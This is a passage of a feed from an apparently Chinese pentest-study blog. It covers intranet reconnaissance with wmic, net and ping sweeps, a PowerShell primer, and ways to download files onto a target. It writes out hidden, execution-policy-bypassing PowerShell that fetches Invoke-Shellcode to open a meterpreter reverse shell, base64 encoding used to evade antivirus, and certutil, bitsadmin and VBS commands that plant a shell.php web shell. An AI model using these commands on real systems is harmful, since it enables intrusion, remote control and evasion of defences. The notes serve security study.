class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /V PortNumber</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320210727867.png" alt="远程端口"></p><p>连接的端口为0xd3d，转换后为3389</p></li><li><p>在Windows server 2003中开启3389</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting <span class="built_in">where</span> (_CLASS !=<span class="string">""</span>) callsetallowtsconnections 1</span><br></pre></td></tr></table></figure></li><li><p>在Windows server 2008和Windows server 2012中开启3389</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic/namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="built_in">where</span> (_CLASS !=<span class="string">""</span>) call setallowsconnections 1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic/namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="built_in">where</span> (TerminalName=<span class="string">'RDP-Tcp'</span>) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="自动收集信息"><a href="#自动收集信息" class="headerlink" title="自动收集信息"></a>自动收集信息</h3><p>为了简化操作，可以创建一个脚本，在目标机器上述完成流程、服务、用户账号、用户组、网络接口、硬盘信息、网络共享信息、操作系统、安装补丁、安装软件、启动时运行的程序、时区等信息的查询工作。</p><p>推荐使用利用<code>WMIC</code>收集目标信息。在默认情况下，任何版本的Windows XP的低权限用户不能访问wmic，Windows 7以上版本的低权限用户允许访问wmic并执行相关查询操作。</p><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a> 执行该脚本后会将所有结果写入一个 html 文件。</p><img src="/posts/12754/images\image-20200321150034222.png" alt="image-20200321150034222" style="zoom:80%;"><h3 id="Empire下主机信息收集"><a href="#Empire下主机信息收集" class="headerlink" title="Empire下主机信息收集"></a>Empire下主机信息收集</h3><p>Empire提供了用于收集主机信息的模块。输入命令<code>usemodule situational_awareness/host/winenum</code>，即可查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息等。</p><p>另外，<code>situational_awareness/host/winenum</code>模块激活包含了系统中所有有用的信息，例如目标主机事件日志、应用程序控制策略日志，包含RDP登录信息、powershell脚本运行和保存的信息等。</p><p><strong>运行这个模块需要管理员权限。</strong></p><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><ol><li><p>查看当前权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>本地普通用户（commando本机的fireeye用户）</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321150415512.png" alt="image-20200321150415512"></p><p>本地管理员用户（win-nmcuole3s38本机的administrator用户）</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321151122737.png" alt="image-20200321151122737"></p><p>域内用户（test域内administrator用户）</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321150920756.png" alt="image-20200321150920756"></p><p>如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无需额外输入账号密码。</p><p>本地管理员administrator权限可以直接提升为Ntauthority或system权限，因此在域中，除普通用户外，所以的机器都有一个机器用户（用户名是机器名+$）。在本质上，机器的system用户对应的就是域里面的机器用户。所以使用system权限可运行域内的查询命令。</p></li><li><p>获取域SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><img src="/posts/12754/images\image-20200321162551515.png" alt="image-20200321162551515" style="zoom:80%;"><p>500 为域用户administrator的SID，前面的是test域的SID</p></li><li><p>查询指定用户的详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure><img src="/posts/12754/images\image-20200321162905059.png" alt="image-20200321162905059" style="zoom:67%;"></li></ol><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><p>获得了本机的相关信息后，就要判断当前内网中是否存在域，如果存在，就要判断所控主机是否在域内。</p><ol><li><p>使用 ipconfig 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>查看网关IP、DNSIP、域名、本机是否和DNS服务器处于同一网段</p><img src="/posts/12754/images\image-20200321163459590.png" alt="image-20200321163459590" style="zoom:60%;"><p>用 nslookup 解析域名的IP地址。用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台机器上。</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321163655780.png" alt="image-20200321163655780"></p></li><li><p>查看系统详细信息</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321163851946.png" alt="image-20200321163851946"></p><p>”域“即域名test.com、“登录服务器”为域控制器，如果“域”为“WORKGROUP”，表示当前机器不在域内。</p></li><li><p>查询当前登录域及登录用户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><img src="/posts/12754/images\image-20200321164309260.png" alt="image-20200321164309260" style="zoom:80%;"></li><li><p>判断主域(域服务器通常会同时作为时间服务器使用)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164434781.png" alt="image-20200321164434781"></p><p>执行上面的命令，通常有3中情况：</p><ul><li><p>存在域，当前用户不是域用户</p><p>发生系统错误 5。拒绝访问。</p></li><li><p>存在域，当前用户是域用户</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164840696.png" alt="image-20200321164840696"></p></li><li><p>不存在域</p><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164821261.png" alt="image-20200321164821261"></p></li></ul></li></ol><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="利用NetBIOS快速探测内网"><a href="#利用NetBIOS快速探测内网" class="headerlink" title="利用NetBIOS快速探测内网"></a>利用NetBIOS快速探测内网</h3><p>NetBIOS是局域网程序使用的一种应用程序编程接口，为程序提供了请求低级服务的统一的命令集，为局域网提供了网络及其他特殊功能。NetBIOS也是计算机的命名标识，主要用于局域网中计算机的互访。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此<strong>推荐使用</strong>。</p><p>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。有Windows和Linux两个版本，体积很小，不需要安装特殊的库或DLL就能使用。</p><p>将其上传的目标上，然后直接输入IP地址范围并运行。输入<code>nbtscan.exe</code>查看帮助文档。</p><h3 id="利用ICMP协议快速探测内网"><a href="#利用ICMP协议快速探测内网" class="headerlink" title="利用ICMP协议快速探测内网"></a>利用ICMP协议快速探测内网</h3><p>一次对内网中的每个IP地址执行ping命令，可以快速找到内网存活主机。在渗透测试中可以探测整个C段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure><p><img src="/posts/12754/F:%5Cimages%5Cimage-20200322174613782.png" alt="icmp探测"></p><p>vbs脚本</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">"192.168.1."</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">Set</span> objTS = Objfso.CreateTextFile(<span class="string">"C:\Windows\Temp\Result.txt"</span>)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span></span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">" is alived ! :)"</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">objTS.close</span><br><span class="line">WScript.Echo <span class="string">"All Ping Scan , All Done ! :)"</span></span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer)</span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\.\root\cimv2"</span>)</span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">"Select * From Win32_PingStatus Where Address='"</span> &amp; strComputer &amp; <span class="string">"'"</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">Ping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">Ping = <span class="literal">False</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><img src="/posts/12754/images\image-20200322181818410.png" alt="image-20200322181818410" style="zoom:80%;"><h3 id="通过ARP扫描探测内网"><a href="#通过ARP扫描探测内网" class="headerlink" title="通过ARP扫描探测内网"></a>通过ARP扫描探测内网</h3><ol><li><p>arp-scan工具</p><p>直接把arp.exe上传到目标机器中运行，可以自定义掩码、指定扫描范围等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.exe -t 192.168.1.0/20</span><br></pre></td></tr></table></figure></li><li><p>Empire中的arpscan模块</p><p>该模块用于在局域网内发送ARP数据包、收集活跃主机的IP地址和MAC地址信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure></li><li><p>Nishang中的Invoke-ARPScan.ps1脚本</p><p>将脚本上传到目标机器上运行，也可以直接远程加载脚本、自定义掩码和扫描范围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">"&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20&#125;"</span> &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure></li><li><p>通过常规TCP/UDP端口扫描探测内网</p><p>ScanLine是一款经典的端口扫描工具，可以在所有版本的Windows操作系统中使用，体积小，仅使用单个文件，同时支持TCP/UDP端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure></li></ol><h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><p>注意以下几点：</p><ul><li>端口的Banner信息</li><li>端口上运行的服务</li><li>常见应用的默认端口</li></ul><h3 id="利用telnet命令进行扫描"><a href="#利用telnet命令进行扫描" class="headerlink" title="利用telnet命令进行扫描"></a>利用telnet命令进行扫描</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://mysecroad.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>powershell学习</title>
    <link href="http://mysecroad.github.io/posts/57592.html"/>
    <id>http://mysecroad.github.io/posts/57592.html</id>
    <published>2020-04-08T03:30:45.000Z</published>
    <updated>2020-04-26T09:24:33.134Z</updated>
    
    <content type="html"><![CDATA[<h2 id="powershell基础"><a href="#powershell基础" class="headerlink" title="powershell基础"></a>powershell基础</h2><p>Windows Powershell是一种命令行外壳程序和脚本环境，内置在每个受支持的Windows版本中，为Windows命令行使用者和脚本编写者利用 .NET Framework 的强大功能提供了便利。只要可以在一台计算机上面执行代码，就可以将Powershell脚本(.ps1)下载到磁盘中执行（甚至无需将脚本文件写入到磁盘中）。</p><p>特点：</p><ul><li>在win7以上版本默认安装</li><li>脚本可以在内存中运行，不需要写入磁盘</li><li>几乎不会触发杀毒软件</li><li>可以远程执行</li><li>很多工具是基于powershell开发</li><li>cmd的运行通畅会被阻，powershell通常不会</li><li>使Windows脚本执行变得更容易</li><li>可用于管理活动目录</li></ul><table><thead><tr><th align="center">操作系统</th><th align="center">Powershell版本</th><th align="center">是否可升级</th></tr></thead><tbody><tr><td align="center">win7、win server 2008</td><td align="center">2.0</td><td align="center">可升级为3.0/4.0</td></tr><tr><td align="center">win8、win server 2012</td><td align="center">3.0</td><td align="center">可升级为4.0</td></tr><tr><td align="center">win8.1、win server 2012 R2</td><td align="center">4.0</td><td align="center">否</td></tr></tbody></table><p>可以输入 <code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 命令查看Powershell的版本</p><p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319172210196.png" alt="image-20200319172210196"></p><h2 id="powershell基本概念"><a href="#powershell基本概念" class="headerlink" title="powershell基本概念"></a>powershell基本概念</h2><h3 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h3><p>一个powershell脚本其实就是一个简单的文本文件，其扩展名为<code>.ps1</code>。</p><p>powershell脚本文件中包含一系列powershell命令，每个命令显示为单独的一行。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，powershell提供了一个执行策略，默认不能执行。</p><p>如果powershell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-exccutionPolicy</span></span><br><span class="line"><span class="number">1</span>. Restricted  <span class="comment"># 脚本不能运行（默认设置）</span></span><br><span class="line"><span class="number">2</span>. RemoteSigned <span class="comment"># 在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span></span><br><span class="line"><span class="number">3</span>. AllSigned  <span class="comment"># 仅当脚本由受信任的发布者签名时才能运行</span></span><br><span class="line"><span class="number">4</span>. Unrestricted <span class="comment"># 允许所有脚本运行</span></span><br></pre></td></tr></table></figure><p>可以使用下面的cmdlet命令设置powershell的执行策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>要想运行一个powershell脚本，必须输入完整的路径和文件名。</p><p>若在同一目录下，<code>./test.ps1</code>即可</p><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 <code>|</code> 连接</p><p>例：执行下面命令，让所有正在运行的，名字以字符 p 开头的程序停止运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-process</span> p* | <span class="built_in">stop-process</span></span><br></pre></td></tr></table></figure><h2 id="powershell常用命令"><a href="#powershell常用命令" class="headerlink" title="powershell常用命令"></a>powershell常用命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在powershell下，类似cmd命令的命令叫作cmdlet命令。二者命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为<code>Add</code>，<code>Get</code>，<code>Remove</code>，<code>Set</code>，<code>New</code>等。</p><p>powershell命令不区分大小写。</p><p>以文件操作为例：</p><ul><li>新建目录：<code>New-Item whitecellclub-ItemType Directory</code></li><li>新建文件：<code>New-Item light.txt-ItemType File</code></li><li>删除目录：<code>Remove-Item whitecellclub</code></li><li>显示文本内容：<code>Get-Content test.txt</code></li><li>设置文本内容：<code>Set-Content test.txt-Value &quot;hello,world!&quot;</code></li><li>追加内容：<code>Add-Content light.txt-Value &quot;hahaha&quot;</code></li><li>清除内容：<code>Clear-Content test.txt</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在Windows终端下输入 <code>powershell</code>，进入powershell命令行环境。输入 <code>help</code> 显示帮助菜单</p><p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319175708381.png" alt="image-20200319175708381"></p><p>要想运行powershell脚本程序，必须使用管理员权限将策略从<code>Restricted</code>改成<code>Unrestricted</code></p><ol><li><p>绕过本地权限并执行</p><p>将PowerUp.ps1上传到目标服务器。在命令行下执行如下命令，绕过安全策略，在目标服务器执行该脚本</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure><p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320092852102.png" alt="image-20200320092852102"></p><p>将同一个脚本上传到目标服务器中，在目标本地执行脚本文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure><ol start="2"><li>从网站服务器中下载脚本，绕过本地权限并隐藏执行</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[<span class="type">Parameters</span>]</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); <span class="built_in">Invoke-Shellcode</span> <span class="literal">-Payload</span> windows/meterpreter/reverse_https <span class="literal">-Lhost</span> <span class="number">192.168</span>.<span class="number">150.141</span> <span class="literal">-Lport</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><ul><li>-ExecutionPolicy Bypass (-Exec Bypass)：绕过执行安全策略。这个参数非常重要。在默认情况下，powershell的安全策略规定powershell不能运行命令和文件。</li><li>-WindowStyle Hidden (-W Hidden)：隐藏窗口</li><li>-NonInteractive (-NonI)：非交互模式。powershell不为用户提供交互式的提示</li><li>-NoProfile (-NoP)：powershell控制台不加载当前用户的配置文件</li><li>-noexit：执行后不退出shell。这个参数在使用键盘记录等脚本时非常重要</li><li>-NoLogo：启动不显示版权标志的powershell</li></ul><ol start="3"><li><p>使用base64对powershell命令进行编码</p><p>使用Base64对powershell命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。</p><p>可以使用python脚本对所有的powershell命令进行base64编码。<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py" target="_blank" rel="noopener">python脚本</a></p><p>在使用ps_encoder.py进行文本转换时，转换的对象必须是文本文件，因此先把命令保存为文本文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> &gt;raw.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320110707604.png" alt="image-20200320110707604"></p><p>在远程主机上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码</span><br></pre></td></tr></table></figure></li></ol><h3 id="运行32位和64位powershell"><a href="#运行32位和64位powershell" class="headerlink" title="运行32位和64位powershell"></a>运行32位和64位powershell</h3><p>一些powershell脚本只能在指定平台上运行。在64位的Windows操作系统中，存在两个版本的powershell，一个是x64，另一个是x86。这两个版本的执行策略不会相互影响，可以把它们看成两个独立的程序。x64版本的powershell的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0\</code>目录下。</p><p>运行32位Powershell脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass</span><br></pre></td></tr></table></figure><p>运行64位Powershell脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;powershell基础&quot;&gt;&lt;a href=&quot;#powershell基础&quot; class=&quot;headerlink&quot; title=&quot;powershell基础&quot;&gt;&lt;/a&gt;powershell基础&lt;/h2&gt;&lt;p&gt;Windows Powershell是一种命令行外壳程序和脚
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件下载</title>
    <link href="http://mysecroad.github.io/posts/18452.html"/>
    <id>http://mysecroad.github.io/posts/18452.html</id>
    <published>2020-04-08T03:29:44.000Z</published>
    <updated>2020-04-26T13:24:23.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="0x00-certutil"><a href="#0x00-certutil" class="headerlink" title="0x00 certutil"></a>0x00 certutil</h3><p>certutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。</p><p><strong>命令详解</strong></p><p>certutil -urlcache -split -f <a href="http://192.168.72.10/shell.php" target="_blank" rel="noopener">http://192.168.72.10/shell.php</a></p><p>将shell.php下载当当前目录</p><p>该命令适用于 server 2003以上版本</p><h3 id="0x01-bitsadmin"><a href="#0x01-bitsadmin" class="headerlink" title="0x01 bitsadmin"></a>0x01 bitsadmin</h3><p>BITSAdmin是一个命令行工具，可用于创建下载或上传作业并监视其进度。</p><p><strong>命令详解</strong></p><p><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.72.10/shell.php&quot; &quot;E:\phpstudy_pro\WWW\shell.php&quot;</code></p><p>将shell.php下载到E:\phpstudy_pro\WWW\目录</p><p>该命令适用于win 7以上版本</p><h3 id="0x02-powersehll"><a href="#0x02-powersehll" class="headerlink" title="0x02 powersehll"></a>0x02 powersehll</h3><p><strong>命令详解</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell(<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.72.10/shell.php'</span>,<span class="string">'E:\phpstudy_pro\WWW\shell.php'</span>)</span><br></pre></td></tr></table></figure><p>将shell.php脚本下载到当前目录</p><p>该命令适用于server 2003以上版本</p><h3 id="0x03-vbs"><a href="#0x03-vbs" class="headerlink" title="0x03 vbs"></a>0x03 vbs</h3><ul><li>第一种</li></ul><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.203.140/a.ps1"</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile <span class="string">"D:/a.ps1"</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure><p>把下载地址直接echo输入download.vbs。直接下载即可</p><p>该命令适用于server 2003以上版本</p><ul><li>第二种</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># echo <span class="keyword">set</span> a=<span class="built_in">createobject</span>(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="keyword">set</span> w=<span class="built_in">createobject</span>(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open^<span class="string">"get^"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br><span class="line"># cscript downfile.vbs http://192.168.203.140/a.ps1 